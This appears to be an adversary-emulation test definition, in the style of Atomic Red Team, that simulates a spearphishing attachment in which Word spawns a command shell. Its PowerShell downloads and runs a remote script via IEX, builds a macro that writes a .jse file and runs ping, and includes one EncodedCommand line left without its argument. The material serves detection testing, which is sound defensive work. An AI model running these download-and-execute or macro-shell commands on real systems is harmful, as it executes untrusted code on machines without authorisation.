- id: d0cb583c-a4cf-5447-8ea5-b4c0a45aaf56
  name: Soumaia ART Tests - Word spawned a command shell and used an IP address in the command line
  description: 'Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.

    Upon execution, CMD will be launched and ping 8.8.8.8.'
  tactic: initial-access
  technique:
    attack_id: T1566.001
    name: 'Phishing: Spearphishing Attachment'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
          }
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
          Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
        cleanup: |-
          Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
